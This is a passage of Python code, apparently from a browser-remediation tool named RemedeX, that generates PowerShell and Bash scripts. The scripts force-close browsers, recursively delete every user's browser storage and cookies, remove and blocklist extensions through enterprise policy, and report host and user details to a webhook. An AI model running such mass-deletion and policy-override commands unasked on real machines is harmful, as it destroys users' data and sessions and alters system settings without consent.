                $dirs = [System.IO.Directory]::GetDirectories("C:\\Users", "AppData", [System.IO.SearchOption]::AllDirectories) 2>$null
                Write-Log "  .NET found $($dirs.Count) AppData dirs"
            } catch {
                Write-Log "  .NET DirectoryInfo fallback failed: $_" "WARN"
            }
            break
        }
        
        # Manual per-user enumeration with .NET as last resort
        $systemAccounts = @("Public", "Default", "Default User", "All Users", "defaultuser0")
        try {
            $userDirs = [System.IO.Directory]::GetDirectories("C:\\Users")
        } catch {
            $userDirs = @()
            Write-Log "  Cannot list C:\\Users: $_" "ERROR"
        }
        foreach ($userDir in $userDirs) {
            $dirName = [System.IO.Path]::GetFileName($userDir)
            if ($systemAccounts -contains $dirName) { continue }
            Write-Log "  Scanning user: $dirName ($userDir)"
            foreach ($browser in $BrowserRelativePaths.Keys) {
                $relPath = $BrowserRelativePaths[$browser]
                $full = [System.IO.Path]::Combine($userDir, $relPath)
                $exists = [System.IO.Directory]::Exists($full)
                Write-Log "    $browser -> $full = $exists"
                if ($exists) {
                    if (-not $result.ContainsKey($browser)) { $result[$browser] = @() }
                    $result[$browser] += $full
                }
            }
        }
    }
    
    # Ultra-fallback: try icacls/dir for diagnostics if still nothing
    if ($result.Count -eq 0) {
        Write-Log "All detection methods failed. Running diagnostics..." "ERROR"
        try {
            $usersContent = cmd /c "dir C:\\Users /B /AD 2>&1"
            Write-Log "  dir C:\\Users: $usersContent"
        } catch {}
        $systemAccounts = @("Public", "Default", "Default User", "All Users", "defaultuser0")
        try {
            $userDirs = [System.IO.Directory]::GetDirectories("C:\\Users")
        } catch {
            $userDirs = @()
        }
        foreach ($userDir in $userDirs) {
            $dirName = [System.IO.Path]::GetFileName($userDir)
            if ($systemAccounts -contains $dirName) { continue }
            try {
                $subDirs = cmd /c "dir `"$userDir`" /B /AD 2>&1"
                Write-Log "  dir $userDir : $subDirs"
                $appLocal = [System.IO.Path]::Combine($userDir, "AppData", "Local")
                $subDirs2 = cmd /c "dir `"$appLocal`" /B /AD 2>&1"
                Write-Log "  dir $appLocal : $subDirs2"
            } catch {
                Write-Log "  Cannot read $userDir : $_" "ERROR"
            }
        }
    }
    
    return $result
}

function Test-BrowserRunning {
    param([string]$Browser)
    $processName = $BrowserProcesses[$Browser]
    return (Get-Process -Name $processName -ErrorAction SilentlyContinue) -ne $null
}

function Clear-ChromiumBrowserData {
    param([string]$Browser, [string]$BasePath, [bool]$ClearCookies)
    
    if (-not (Test-Path $BasePath)) {
        Write-Log "$Browser not found at $BasePath" "WARN"
        return
    }
    
    Write-Log "Cleaning $Browser data..."
    
    # Get all profiles
    $profiles = @("Default") + (Get-ChildItem -Path $BasePath -Directory -Filter "Profile *" | Select-Object -ExpandProperty Name)
    
    foreach ($profile in $profiles) {
        $profilePath = Join-Path $BasePath $profile
        if (-not (Test-Path $profilePath)) { continue }
        
        Write-Log "  Processing profile: $profile"
        
        # LocalStorage
        $localStorage = Join-Path $profilePath "Local Storage\\leveldb"
        if (Test-Path $localStorage) {
            Remove-Item -Path "$localStorage\\*" -Force -Recurse
            Write-Log "    Cleared LocalStorage"
        }
        
        # Session Storage  
        $sessionStorage = Join-Path $profilePath "Session Storage"
        if (Test-Path $sessionStorage) {
            Remove-Item -Path "$sessionStorage\\*" -Force -Recurse
            Write-Log "    Cleared SessionStorage"
        }
        
        # Cache
        $cache = Join-Path $profilePath "Cache\\Cache_Data"
        if (Test-Path $cache) {
            Remove-Item -Path "$cache\\*" -Force -Recurse
            Write-Log "    Cleared Cache"
        }
        
        # Service Workers
        $serviceWorkers = Join-Path $profilePath "Service Worker"
        if (Test-Path $serviceWorkers) {
            Remove-Item -Path "$serviceWorkers\\*" -Force -Recurse
            Write-Log "    Cleared Service Workers"
        }
        
        # IndexedDB
        $indexedDb = Join-Path $profilePath "IndexedDB"
        if (Test-Path $indexedDb) {
            Remove-Item -Path "$indexedDb\\*" -Force -Recurse
            Write-Log "    Cleared IndexedDB"
        }
        
        # Cookies (optional)
        if ($ClearCookies) {
            $cookies = Join-Path $profilePath "Network\\Cookies"
            if (Test-Path $cookies) {
                Remove-Item -Path $cookies -Force
                Write-Log "    Cleared Cookies"
            }
        }
    }
    
    Write-Log "$Browser cleanup complete" "SUCCESS"
}

function Remove-ExtensionFromPreferences {
    param([string]$BasePath, [string]$ExtensionId)
    
    $profiles = @("Default") + (Get-ChildItem -Path $BasePath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
    
    foreach ($profile in $profiles) {
        $profilePath = Join-Path $BasePath $profile
        if (-not (Test-Path $profilePath)) { continue }
        
        foreach ($prefsFile in @("Preferences", "Secure Preferences")) {
            $prefsPath = Join-Path $profilePath $prefsFile
            if (-not (Test-Path $prefsPath)) { continue }
            
            try {
                $content = Get-Content -Path $prefsPath -Raw -Encoding UTF8
                $prefs = $content | ConvertFrom-Json
                $settings = $prefs.extensions.settings
                if ($settings -and ($settings.PSObject.Properties.Name -contains $ExtensionId)) {
                    $settings.PSObject.Properties.Remove($ExtensionId)
                    $prefs | ConvertTo-Json -Depth 100 -Compress | Set-Content -Path $prefsPath -Encoding UTF8
                    Write-Log "    Removed $ExtensionId from $profile/$prefsFile" "SUCCESS"
                }
            } catch {
                Write-Log "    Could not clean $profile/${prefsFile}: $_" "WARN"
            }
        }
    }
}

function Remove-ChromiumExtension {
    param([string]$Browser, [string]$BasePath, [string]$ExtensionId)
    
    if (-not (Test-Path $BasePath)) {
        return $false
    }
    
    $removed = $false
    $profiles = @("Default") + (Get-ChildItem -Path $BasePath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
    $extSubdirs = @("Extensions", "Local Extension Settings", "Managed Extension Settings",
                     "Sync Extension Settings", "Extension Rules", "Extension Scripts")
    
    foreach ($profile in $profiles) {
        Write-Log "  Scanning profile: $profile"
        foreach ($subdir in $extSubdirs) {
            $extPath = Join-Path $BasePath "$profile\\$subdir\\$ExtensionId"
            if (Test-Path $extPath) {
                try {
                    Remove-Item -Path $extPath -Force -Recurse
                    Write-Log "    Removed from $profile/$subdir" "SUCCESS"
                    $removed = $true
                } catch {
                    Write-Log "    WARN: Failed to remove from $profile/${subdir}: $_" "ERROR"
                }
            }
        }
        # Clean extension-specific IndexedDB
        $idbPath = Join-Path $BasePath "$profile\\IndexedDB"
        if (Test-Path $idbPath) {
            Get-ChildItem -Path $idbPath -Filter "*$ExtensionId*" -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item -Path $_.FullName -Force -Recurse -ErrorAction SilentlyContinue
                Write-Log "    Removed IndexedDB for $ExtensionId" "SUCCESS"
            }
        }
    }
    
    # Always clean preferences to prevent Chrome from re-installing
    Write-Log "  Cleaning extension from preferences files..."
    Remove-ExtensionFromPreferences -BasePath $BasePath -ExtensionId $ExtensionId
    
    # Apply blocklist if enabled
    if ($ApplyBlocklist) {
        Add-ExtensionToBlocklist -Browser $Browser -ExtensionId $ExtensionId
    }
    
    return $removed
}

$PolicyPaths = @{
    "Chrome" = "SOFTWARE\\Policies\\Google\\Chrome"
    "Edge"   = "SOFTWARE\\Policies\\Microsoft\\Edge"
    "Brave"  = "SOFTWARE\\Policies\\BraveSoftware\\Brave"
}

function Add-ExtensionToBlocklist {
    param([string]$Browser, [string]$ExtensionId)
    
    $policyBase = $PolicyPaths[$Browser]
    if (-not $policyBase) { return }
    $keyPath = "HKLM:\\$policyBase\\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $keyPath)) {
        New-Item -Path $keyPath -Force | Out-Null
    }
    
    $existing = Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue
    $nextIdx = 1
    if ($existing) {
        foreach ($prop in $existing.PSObject.Properties) {
            if ($prop.Value -eq $ExtensionId) {
                Write-Log "  $ExtensionId already in policy blocklist" "SUCCESS"
                return
            }
            if ($prop.Name -match '^\\d+$') {
                $nextIdx = [Math]::Max($nextIdx, [int]$prop.Name + 1)
            }
        }
    }
    
    Set-ItemProperty -Path $keyPath -Name $nextIdx -Value $ExtensionId -Type String
    Write-Log "  Added $ExtensionId to $Browser policy blocklist (registry)" "SUCCESS"
}

function Disable-AllExtensionSync {
    param([string[]]$Browsers)
    Write-Log "Disabling extension sync via enterprise policies..."
    foreach ($browser in $Browsers) {
        $policyBase = $PolicyPaths[$browser]
        if (-not $policyBase) { continue }
        $keyPath = "HKLM:\\$policyBase"
        if (-not (Test-Path $keyPath)) {
            New-Item -Path $keyPath -Force | Out-Null
        }
        Set-ItemProperty -Path $keyPath -Name "SyncDisabled" -Value 1 -Type DWord
        Write-Log "  Disabled sync for $browser via HKLM policy" "SUCCESS"
    }
}

# Main execution
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Browser Data Cleanup Script" -ForegroundColor Cyan
Write-Host "  Clears ALL browser data from ALL sites" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Write log header
"=" * 70 | Out-File -FilePath $LogFile -Encoding UTF8
"  RemedeX Browser Cleanup - Execution Log" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  Host:    $env:COMPUTERNAME ($env:USERNAME)" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  OS:      $([System.Environment]::OSVersion.VersionString)" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"=" * 70 | Out-File -FilePath $LogFile -Append -Encoding UTF8
"" | Out-File -FilePath $LogFile -Append -Encoding UTF8

Write-Log "Log file: $LogFile"

# Send start webhook
Send-Webhook @{
    event = "remedex_cleanup_started"
    host = $env:COMPUTERNAME
    user = $env:USERNAME
    os = [System.Environment]::OSVersion.VersionString
    timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    log_file = $LogFile
}

$_scriptStatus = "success"
$_scriptError = ""
$closedBrowsers = @()
$targetBrowsers = @()
$extResults = @()
$cleanResults = @()

try {

# Step 1: Force-close ALL browser processes unconditionally (before path discovery)
Write-Log "Force-closing all browser processes..."
foreach ($browser in $BrowserProcesses.Keys) {
    $processName = $BrowserProcesses[$browser]
    $procs = Get-Process -Name $processName -ErrorAction SilentlyContinue
    if ($procs) {
        Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
        Write-Log "  Stopped $browser ($processName) - $($procs.Count) process(es)" "SUCCESS"
        $closedBrowsers += $browser
    }
}
if ($closedBrowsers.Count -eq 0) {
    Write-Log "  No browser processes were running"
} else {
    Start-Sleep -Seconds 2
}

# Step 2: Discover browser paths across ALL user profiles on this machine
$allBrowserPaths = Get-AllBrowserPaths
$targetBrowsers = @($allBrowserPaths.Keys)

if ($Browsers.Count -gt 0) {
    $targetBrowsers = $targetBrowsers | Where-Object { $Browsers -contains $_ }
}

Write-Log "Found browsers: $($targetBrowsers -join ', ')"

if ($targetBrowsers.Count -eq 0) {
    Write-Log "No target browsers found across any user profile" "ERROR"
    $_scriptStatus = "failed"
    $_scriptError = "No browsers found in any user profile under C:\\Users"
    return
}

# Step 3: Remove specified extensions across all user profiles
if ($RemoveExtension.Count -gt 0) {
    Write-Host ""
    Write-Log "Removing specified extensions..."
    foreach ($extId in $RemoveExtension) {
        Write-Log "Looking for extension: $extId"
        $found = $false
        foreach ($browser in $targetBrowsers) {
            foreach ($basePath in $allBrowserPaths[$browser]) {
                if (Remove-ChromiumExtension -Browser $browser -BasePath $basePath -ExtensionId $extId) {
                    $found = $true
                    $extResults += "${browser}: removed $extId from $basePath"
                }
            }
        }
        if (-not $found) {
            Write-Log "Extension $extId not found in any browser/user" "WARN"
            $extResults += "NOT FOUND: $extId"
        }
    }
}

# Step 4: Clean browser data across all user profiles
$cleanResults = @()
foreach ($browser in $targetBrowsers) {
    foreach ($basePath in $allBrowserPaths[$browser]) {
        $userDir = ($basePath -split '\\\\Users\\\\')[1].Split('\\')[0]
        Write-Log "Cleaning $browser for user: $userDir"
        Clear-ChromiumBrowserData -Browser $browser -BasePath $basePath -ClearCookies $IncludeCookies
        $cleanResults += "${browser}/${userDir}: cleaned"
    }
}

Write-Host ""
Write-Log "Cleanup complete!" "SUCCESS"
Write-Host ""

# Step 5: Disable extension sync (if requested)
if ($DisableSync) {
    Write-Host ""
    Disable-AllExtensionSync -Browsers $targetBrowsers
}

# Write summary footer to log
"" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"=" * 70 | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  SUMMARY" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"=" * 70 | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  Finished:  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  Browsers:  $($targetBrowsers -join ', ')" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  Users:     $((Get-UserHomeDirs) | ForEach-Object { Split-Path $_ -Leaf })" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  Cookies:   $(if ($IncludeCookies) {'Cleared'} else {'Skipped'})" | Out-File -FilePath $LogFile -Append -Encoding UTF8
if ($RemoveExtension.Count -gt 0) {
    "  Extensions removed: $($RemoveExtension -join ', ')" | Out-File -FilePath $LogFile -Append -Encoding UTF8
}
if ($DisableSync) {
    "  Sync:      Disabled via enterprise policy" | Out-File -FilePath $LogFile -Append -Encoding UTF8
}
"  Closed browsers: $($closedBrowsers -join ', ')" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"=" * 70 | Out-File -FilePath $LogFile -Append -Encoding UTF8
"" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  TROUBLESHOOTING" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"-" * 70 | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  - If cleanup failed: ensure browsers are closed before running." | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  - If extension keeps returning: check chrome://policy for blocklist." | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  - If policy not applied: run this script as Administrator." | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  - Registry policy path: HKLM\\SOFTWARE\\Policies\\Google\\Chrome" | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  - To verify policies: open chrome://policy in the browser." | Out-File -FilePath $LogFile -Append -Encoding UTF8
"  - To undo blocklist: use RemedeX GUI > Manage Blocklist > Unblock." | Out-File -FilePath $LogFile -Append -Encoding UTF8
"=" * 70 | Out-File -FilePath $LogFile -Append -Encoding UTF8

Write-Host ""
Write-Log "Full log saved to: $LogFile" "SUCCESS"

} catch {
    $_scriptStatus = "failed"
    $_scriptError = $_.Exception.Message
    Write-Log "Script failed with error: $_scriptError" "ERROR"
} finally {
    # ALWAYS send completion webhook
    $logContent = ""
    try { $logContent = Get-Content -Path $LogFile -Raw -ErrorAction SilentlyContinue } catch {}
    $logTail = if ($logContent -and $logContent.Length -gt 3000) { $logContent.Substring($logContent.Length - 3000) } else { $logContent }
    Send-Webhook @{
        event = "remedex_cleanup_finished"
        host = $env:COMPUTERNAME
        user = $env:USERNAME
        status = $_scriptStatus
        error = $_scriptError
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        browsers_found = ($targetBrowsers -join ", ")
        browsers_closed = ($closedBrowsers -join ", ")
        extensions_results = $extResults
        clean_results = $cleanResults
        cookies_cleared = [bool]$IncludeCookies
        sync_disabled = [bool]$DisableSync
        preferences_cleaned = [bool]$CleanPreferences
        log_file = $LogFile
        log_content = $logTail
    }
}
'''
        script = script.replace("{browsers_str}", browsers_str)
        script = script.replace("{exts_str}", exts_str)
        script = script.replace("{disable_sync_val}", disable_sync_val)
        script = script.replace("{clean_prefs_val}", clean_prefs_val)
        script = script.replace("{apply_blocklist_val}", apply_blocklist_val)
        script = script.replace("{webhook_url}", webhook_url_val)
        
        return script
    
    def _generate_bash_cleanup_script(self, disable_sync: bool = False, clean_preferences: bool = False, webhook_url: str = "", apply_blocklist: bool = True) -> str:
        """Generate Bash script for remote Linux/Mac cleanup"""
        disable_sync_val = "true" if disable_sync else "false"
        clean_prefs_val = "true" if clean_preferences else "false"
        apply_blocklist_val = "true" if apply_blocklist else "false"
        webhook_url_val = webhook_url if webhook_url else ""
        script = '''#!/bin/bash
#
# Browser Data Cleanup Script - Clears ALL browser data from ALL websites
#
# This script removes browser data including:
# - LocalStorage (all websites)
# - SessionStorage
# - Cache
# - Service Workers
# - Cookies (optional)
# - IndexedDB
#
# Usage: ./browser_cleanup.sh [--cookies] [--force] [--browsers chrome,edge,brave]
#

INCLUDE_COOKIES=false
DISABLE_SYNC={disable_sync_val}
CLEAN_PREFERENCES={clean_prefs_val}
APPLY_BLOCKLIST={apply_blocklist_val}
FORCE=false
TARGET_BROWSERS=""
LOG_FILE="/tmp/remedex_cleanup_$(date '+%Y%m%d_%H%M%S').log"
WEBHOOK_URL="{webhook_url}"
SCRIPT_EXIT_CODE=0

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --cookies) INCLUDE_COOKIES=true; shift ;;
        --disable-sync) DISABLE_SYNC=true; shift ;;
        --force) FORCE=true; shift ;;
        --browsers) TARGET_BROWSERS="$2"; shift 2 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

# Detect OS
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="mac"
else
    OS="linux"
fi

send_webhook() {
    [[ -z "$WEBHOOK_URL" ]] && return
    local payload="$1"
    curl -s -o /dev/null -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --connect-timeout 10 2>/dev/null || true
}

log() {
    local line="[$(date '+%Y-%m-%d %H:%M:%S')] $1"
    echo "$line"
    echo "$line" >> "$LOG_FILE" 2>/dev/null || true
}

_COMPLETION_WEBHOOK_SENT=false
send_completion_webhook() {
    [[ "$_COMPLETION_WEBHOOK_SENT" == "true" ]] && return
    _COMPLETION_WEBHOOK_SENT=true
    [[ -z "$WEBHOOK_URL" ]] && return
    local exit_code="${1:-$SCRIPT_EXIT_CODE}"
    local status="success"
    [[ "$exit_code" != "0" ]] && status="failed"
    local LOG_TAIL=""
    LOG_TAIL=$(tail -c 3000 "$LOG_FILE" 2>/dev/null || echo "")
    local ESCAPED_LOG=""
    ESCAPED_LOG=$(echo "$LOG_TAIL" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null || echo "\"log unavailable\"")
    local WH_PAYLOAD="{\"event\":\"remedex_cleanup_finished\",\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"status\":\"$status\",\"exit_code\":$exit_code,\"timestamp\":\"$(date '+%Y-%m-%d %H:%M:%S')\",\"browsers_found\":\"${FOUND_BROWSERS:-none}\",\"browsers_closed\":\"${CLOSED_BROWSERS:-none}\",\"cleaned\":\"${CLEAN_RESULTS:-none}\",\"cookies_cleared\":${INCLUDE_COOKIES:-false},\"sync_disabled\":${DISABLE_SYNC:-false},\"preferences_cleaned\":${CLEAN_PREFERENCES:-false},\"log_file\":\"$LOG_FILE\",\"log_content\":$ESCAPED_LOG}"
    send_webhook "$WH_PAYLOAD"
}

trap 'send_completion_webhook $?' EXIT

is_browser_running() {
    pgrep -x "$1" > /dev/null 2>&1
}

discover_home_dirs() {
    local homes=()
    local system_accounts="Shared Guest nobody daemon _www _sentinelshell"
    if [[ "$OS" == "mac" ]]; then
        for d in /Users/*; do
            [[ ! -d "$d" ]] && continue
            local name=$(basename "$d")
            [[ "$system_accounts" == *"$name"* ]] && continue
            homes+=("$d")
        done
    else
        for d in /home/*; do
            [[ ! -d "$d" ]] && continue
            homes+=("$d")
        done
    fi
    if [[ ${#homes[@]} -eq 0 ]] && [[ -n "$HOME" ]] && [[ -d "$HOME" ]]; then
        homes+=("$HOME")
    fi
    printf '%s\n' "${homes[@]}"
}

get_browser_paths_for_home() {
    local home_dir="${1%/}"
    local browser="$2"
    if [[ "$OS" == "mac" ]]; then
        case "$browser" in
            chrome)  echo "$home_dir/Library/Application Support/Google/Chrome" ;;
            brave)   echo "$home_dir/Library/Application Support/BraveSoftware/Brave-Browser" ;;
            edge)    echo "$home_dir/Library/Application Support/Microsoft Edge" ;;
        esac
    else
        case "$browser" in
            chrome)  echo "$home_dir/.config/google-chrome" ;;
            brave)   echo "$home_dir/.config/BraveSoftware/Brave-Browser" ;;
            edge)    echo "$home_dir/.config/microsoft-edge" ;;
        esac
    fi
}

clean_chromium_browser() {
    local name="$1"
    local base_path="$2"
    
    if [[ ! -d "$base_path" ]]; then
        log "WARN: $name not found"
        return
    fi
    
    log "Cleaning $name..."
    
    for profile in "$base_path/Default" "$base_path/Profile "*; do
        [[ ! -d "$profile" ]] && continue
        
        log "  Processing: $(basename "$profile")"
        
        # LocalStorage
        rm -rf "$profile/Local Storage/leveldb/"* 2>/dev/null && log "    Cleared LocalStorage"
        
        # Session Storage
        rm -rf "$profile/Session Storage/"* 2>/dev/null && log "    Cleared SessionStorage"
        
        # Cache
        rm -rf "$profile/Cache/Cache_Data/"* 2>/dev/null && log "    Cleared Cache"
        
        # Service Workers
        rm -rf "$profile/Service Worker/"* 2>/dev/null && log "    Cleared Service Workers"
        
        # IndexedDB
        rm -rf "$profile/IndexedDB/"* 2>/dev/null && log "    Cleared IndexedDB"
        
        # Cookies
        if $INCLUDE_COOKIES; then
            rm -f "$profile/Network/Cookies" 2>/dev/null && log "    Cleared Cookies"
        fi
    done
    
    log "$name cleanup complete"
}

# Extension IDs to remove (set via GUI or manually)
if [[ -z "${REMOVE_EXTENSIONS+x}" ]]; then
    REMOVE_EXTENSIONS=()
fi

remove_extension_from_preferences() {
    local base_path="$1"
    local ext_id="$2"
    if ! command -v python3 &>/dev/null; then
        log "    WARN: python3 not found, cannot clean preferences"
        return
    fi
    local profiles=()
    if [[ -d "$base_path/Default" ]]; then
        profiles+=("$base_path/Default")
    fi
    for p in "$base_path/Profile "*; do
        [[ -d "$p" ]] && profiles+=("$p")
    done
    for profile in "${profiles[@]}"; do
        local pname=$(basename "$profile")
        for prefs_file in "Preferences" "Secure Preferences"; do
            local pf="$profile/$prefs_file"
            [[ ! -f "$pf" ]] && continue
            local result
            result=$(python3 - "$pf" "$ext_id" <<'PYEOF'
import json, sys, os
pf, ext_id = sys.argv[1], sys.argv[2]
try:
    with open(pf, 'r') as f:
        prefs = json.load(f)
    settings = prefs.get('extensions', {}).get('settings', {})
    if ext_id in settings:
        del settings[ext_id]
        with open(pf, 'w') as f:
            json.dump(prefs, f, separators=(',', ':'))
        print(f'CLEANED:{ext_id}')
    else:
        print(f'NOT_FOUND:{ext_id}')
except Exception as e:
    print(f'ERROR:{e}', file=sys.stderr)
    sys.exit(1)
PYEOF
            )
            if echo "$result" | grep -q "CLEANED"; then
                log "    Cleaned $ext_id from $pname/$prefs_file"
            elif echo "$result" | grep -q "ERROR"; then
                log "    WARN: Could not clean $pname/$prefs_file: $result"
            fi
        done
    done
}

remove_chromium_extensions() {
    local browser="$1"
    local base_path="$2"
    local ext_id="$3"
    [[ ! -d "$base_path" ]] && return
    local found=false
    
    # Build list of profiles to check
    local profiles=()
    if [[ -d "$base_path/Default" ]]; then
        profiles+=("$base_path/Default")
    fi
    for p in "$base_path/Profile "*; do
        [[ -d "$p" ]] && profiles+=("$p")
    done
    
    if [[ ${#profiles[@]} -eq 0 ]]; then
        log "  WARN: No profiles found in $base_path"
        return
    fi
    
    for profile in "${profiles[@]}"; do
        local pname=$(basename "$profile")
        log "  Scanning profile: $pname"
        
        # Delete from all extension-related directories
        for subdir in "Extensions" "Local Extension Settings" "Managed Extension Settings" "Sync Extension Settings" "Extension Rules" "Extension Scripts"; do
            local target="$profile/$subdir/$ext_id"
            if [[ -d "$target" ]]; then
                rm -rf "$target"
                if [[ -d "$target" ]]; then
                    log "    WARN: Failed to delete from $subdir (permission denied?)"
                else
                    log "    Removed from $pname/$subdir"
                    found=true
                fi
            fi
        done
        
        # Also remove extension-specific IndexedDB storage
        if [[ -d "$profile/IndexedDB" ]]; then
            for idb in "$profile/IndexedDB/"*"$ext_id"*; do
                [[ -e "$idb" ]] && rm -rf "$idb" && log "    Removed IndexedDB for $ext_id"
            done
        fi
    done
    
    # Remove external extension registration files (macOS/Linux)
    if [[ "$OS" == "mac" ]]; then
        local ext_json="/Library/Application Support/Google/Chrome/External Extensions/$ext_id.json"
        if [[ -f "$ext_json" ]]; then
            rm -f "$ext_json" && log "  Removed external extension file: $ext_json"
            found=true
        fi
        for home in "${USER_HOMES[@]}"; do
            local user_ext_json="$home/Library/Application Support/Google/Chrome/External Extensions/$ext_id.json"
            if [[ -f "$user_ext_json" ]]; then
                rm -f "$user_ext_json" && log "  Removed user external extension file: $user_ext_json"
                found=true
            fi
        done
    else
        local ext_json="/opt/google/chrome/extensions/$ext_id.json"
        if [[ -f "$ext_json" ]]; then
            rm -f "$ext_json" && log "  Removed external extension file: $ext_json"
            found=true
        fi
    fi
    
    # Always clean preferences to prevent Chrome from re-installing
    log "  Cleaning extension from preferences files..."
    remove_extension_from_preferences "$base_path" "$ext_id"
    
    # Apply blocklist if enabled
    if $APPLY_BLOCKLIST; then
        add_extension_to_blocklist "$browser" "$ext_id"
    fi
}

add_extension_to_blocklist() {
    local browser="$1"
    local ext_id="$2"
    local policy_dir=""
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        local domain=""
        case "$browser" in
            chrome) domain="com.google.Chrome" ;;
            edge)   domain="com.microsoft.Edge" ;;
            brave)  domain="com.brave.Browser" ;;
            *) return ;;
        esac
        # Write blocklist to ALL macOS policy locations for maximum reliability
        # 1. /Library/Managed Preferences (MDM-style, highest priority)
        local managed_dir="/Library/Managed Preferences"
        mkdir -p "$managed_dir" 2>/dev/null
        defaults write "$managed_dir/$domain" ExtensionInstallBlocklist -array-add "$ext_id" 2>/dev/null && \
            log "  Added $ext_id to managed policy: $managed_dir/$domain.plist"
        # 2. /Library/Preferences (machine-level, read by all users)
        defaults write "/Library/Preferences/$domain" ExtensionInstallBlocklist -array-add "$ext_id" 2>/dev/null && \
            log "  Added $ext_id to machine policy: /Library/Preferences/$domain.plist"
        # 3. Per-user preferences (most reliable for non-MDM environments)
        for home in "${USER_HOMES[@]}"; do
            local username=$(basename "$home")
            sudo -u "$username" defaults write "$domain" ExtensionInstallBlocklist -array-add "$ext_id" 2>/dev/null && \
                log "  Added $ext_id to $domain blocklist for user $username"
        done
    else
        case "$browser" in
            chrome) policy_dir="/etc/opt/chrome/policies/managed" ;;
            edge)   policy_dir="/etc/opt/edge/policies/managed" ;;
            brave)  policy_dir="/etc/brave/policies/managed" ;;
            *) return ;;
        esac
        mkdir -p "$policy_dir" 2>/dev/null
        local policy_file="$policy_dir/remedex_blocklist.json"
        python3 - "$policy_file" "$ext_id" <<'PYEOF'
import sys, json, os
path, ext_id = sys.argv[1], sys.argv[2]
policy = {}
if os.path.isfile(path):
    try:
        with open(path, 'r') as f:
            policy = json.load(f)
    except Exception:
        pass
bl = policy.get("ExtensionInstallBlocklist", [])
if ext_id not in bl:
    bl.append(ext_id)
    policy["ExtensionInstallBlocklist"] = bl
    with open(path, 'w') as f:
        json.dump(policy, f, indent=2)
    print(f"  Added {ext_id} to policy blocklist: {path}")
else:
    print(f"  {ext_id} already in policy blocklist")
PYEOF
    fi
}

disable_all_sync() {
    log "Disabling extension sync via enterprise policies..."
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        local managed_dir="/Library/Managed Preferences"
        mkdir -p "$managed_dir" 2>/dev/null
        for pair in "chrome:com.google.Chrome" "edge:com.microsoft.Edge" "brave:com.brave.Browser"; do
            local browser="${pair%%:*}"
            local domain="${pair#*:}"
            [[ "$TARGET_BROWSERS" != *"$browser"* ]] && continue
            # Write to all policy locations
            defaults write "$managed_dir/$domain" SyncDisabled -bool true 2>/dev/null && \
                log "  Disabled sync for $browser via managed policy: $managed_dir/$domain.plist"
            defaults write "/Library/Preferences/$domain" SyncDisabled -bool true 2>/dev/null && \
                log "  Disabled sync for $browser via machine policy"
            for home in "${USER_HOMES[@]}"; do
                local username=$(basename "$home")
                sudo -u "$username" defaults write "$domain" SyncDisabled -bool true 2>/dev/null && \
                    log "  Disabled sync for $browser for user $username"
            done
        done
    else
        for pair in "chrome:/etc/opt/chrome/policies/managed" "edge:/etc/opt/edge/policies/managed" "brave:/etc/brave/policies/managed"; do
            local browser="${pair%%:*}"
            local policy_dir="${pair#*:}"
            [[ "$TARGET_BROWSERS" != *"$browser"* ]] && continue
            mkdir -p "$policy_dir" 2>/dev/null
            local policy_file="$policy_dir/remedex_sync.json"
            echo '{"SyncDisabled": true}' > "$policy_file"
            log "  Disabled sync for $browser via policy file: $policy_file"
        done
    fi
}

# Main
echo ""
echo "========================================"
echo "  Browser Data Cleanup Script"
echo "  Clears ALL browser data from ALL sites"
echo "========================================"
echo ""

# Write log header
{
    printf '%70s\n' '' | tr ' ' '='
    echo "  RemedeX Browser Cleanup - Execution Log"
    echo "  Started: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "  Host:    $(hostname) ($(whoami))"
    echo "  OS:      $(uname -srm)"
    printf '%70s\n' '' | tr ' ' '='
    echo
} > "$LOG_FILE"

log "Log file: $LOG_FILE"

# Send start webhook
send_webhook "{\"event\":\"remedex_cleanup_started\",\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"os\":\"$(uname -srm)\",\"timestamp\":\"$(date '+%Y-%m-%d %H:%M:%S')\",\"log_file\":\"$LOG_FILE\"}"

# Step 1: Force-close ALL browser processes unconditionally
log "Force-closing all browser processes..."
CLOSED_BROWSERS=""
if [[ "$OS" == "mac" ]]; then
